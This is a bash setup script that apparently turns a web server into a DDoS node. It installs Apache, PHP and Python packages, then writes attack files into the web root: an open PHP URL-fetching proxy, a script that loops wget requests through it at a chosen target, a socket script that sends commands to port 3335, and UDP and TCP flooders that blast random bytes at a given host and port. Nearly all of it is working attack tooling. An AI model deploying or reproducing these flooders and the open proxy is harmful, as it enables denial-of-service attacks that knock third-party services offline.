#!/bin/bash
# Move this to /var/www/html/ after initial setup.sh
echo "Detecting Operating System For Package Installations"
DISTRO=$(cat /etc/*-release 2>/dev/null)
if [ $(echo $DISTRO | grep -i "CentOs" | wc -l) -eq 1 ]; then
        yum install httpd -y 
        yum install python gcc screen -y 
        sudo iptables -I INPUT -p tcp --dport 80 -j ACCEPT 
        sudo service iptables save 
        sudo yum install php php-mysql php-devel php-gd php-pecl-memcache php-pspell php-snmp php-xmlrpc php-xml -y 
        sudo service httpd restart 
        yum install python-setuptools -y
        curl "https://bootstrap.pypa.io/get-pip.py" -o "get-pip.py"
        python get-pip.py
        pip install ipgetter
        pip install paralell-ssh
        pip install pexpect
        


elif [ $(echo $DISTRO | grep -i "Debian" | wc -l) -eq 1 ]; then
        apt-get install php libapache2-mod-php php-mcrypt php-mysql -y
        apt-get install apache2 -y 
        apt-get install python gcc screen -y
        sudo service apache2 restart
        apt-get install python-setuptools -y 
        apt-get install python-pip -y 
        pip install ipgetter 
        pip install paralell-ssh
        pip install pexpect
        
elif [ $(echo $DISTRO | grep -i "Ubuntu" | wc -l) -eq 1 ]; then
        apt-get install php libapache2-mod-php php-mcrypt php-mysql -y
        apt-get install apache2 -y 
        apt-get install python gcc screen -y
        sudo service apache2 restart 
        apt-get install python-setuptools -y 
        apt-get install python-pip -y 
        pip install ipgetter
        pip install paralell-ssh
        pip install pexpect
        
else
        echo "Unknown OS"
fi

echo "Making Files"
touch /var/www/html/url.php
touch /var/www/html/send.py

echo "Filling Files With Data"
echo "<?php file_get_contents(\$_GET['url']);" > /var/www/html/url.php

echo "import os" > /var/www/html/send.py
echo "import ipgetter" >> /var/www/html/send.py
echo "import sys" >> /var/www/html/send.py
echo "import time" >> /var/www/html/send.py
echo "ip = ipgetter.myip()" >> /var/www/html/send.py
echo "url = sys.argv[1]" >> /var/www/html/send.py
echo "reqs = int(sys.argv[2])" >> /var/www/html/send.py
echo "wait_time = sys.argv[3]" >> /var/www/html/send.py
echo "while True:" >> /var/www/html/send.py
echo "    if (reqs == 0):" >> /var/www/html/send.py
echo "        sys.exit(\"Done\")" >> /var/www/html/send.py
echo "    os.system(\"wget http://%s/url.php?url=%s -O /dev/null >/dev/null 2>^1\" % (ip, url))" >> /var/www/html/send.py
echo "    print(\"Request Left: {}\".format(reqs))" >> /var/www/html/send.py
echo "    time.sleep(int(wait_time))" >> /var/www/html/send.py
echo "    reqs -= 1" >> /var/www/html/send.py

echo "import sys,socket" > /var/www/html/feed.py
echo "HOST = sys.argv[1]" >> /var/www/html/feed.py
echo "PORT = 3335" >> /var/www/html/feed.py
echo "ACTION = sys.argv[2]" >> /var/www/html/feed.py
echo "sock = socket.socket()" >> /var/www/html/feed.py
echo "sock.connect((HOST, PORT))" >> /var/www/html/feed.py
echo "sock.send(ACTION)" >> /var/www/html/feed.py
echo "sock.close()" >> /var/www/html/feed.py

echo "import sys, socket, random" > /var/www/html/raw_udp.py
echo "DHOST = sys.argv[1]" >> /var/www/html/raw_udp.py
echo "DPORT = int(sys.argv[2])" >> /var/www/html/raw_udp.py
echo "BYTES = int(sys.argv[3])" >> /var/www/html/raw_udp.py
echo "TIME_AMT = int(sys.argv[3])" >> /var/www/html/raw_udp.py
echo "bytes=random._urandom(BYTES)" >> /var/www/html/raw_udp.py
echo "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); now = time.clock()" >> /var/www/html/raw_udp.py
echo "while (time.clock() - now) < TIME_AMT:" >> /var/www/html/raw_udp.py
echo "    try:" >> /var/www/html/raw_udp.py
echo "        sock.sendto(bytes,(DHOST, DPORT))" >> /var/www/html/raw_udp.py
echo "    except: pass" >> /var/www/html/raw_udp.py

echo "import sys, socket, random" > /var/www/html/raw_tcp.py
echo "DHOST = sys.argv[1]" >> /var/www/html/raw_tcp.py
echo "DPORT = int(sys.argv[2])" >> /var/www/html/raw_tcp.py
echo "BYTES = int(sys.argv[3])" >> /var/www/html/raw_tcp.py
echo "TIME_AMT = int(sys.argv[3])" >> /var/www/html/raw_tcp.py
echo "bytes=random._urandom(BYTES)" >> /var/www/html/raw_tcp.py
echo "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); now = time.clock()" >> /var/www/html/raw_tcp.py
echo "while (time.clock() - now) < TIME_AMT:" >> /var/www/html/raw_tcp.py
echo "    try:" >> /var/www/html/raw_tcp.py
echo "        sock.sendto(bytes,(DHOST, DPORT))" >> /var/www/html/raw_tcp.py
echo "    except: pass" >> /var/www/html/raw_tcp.py
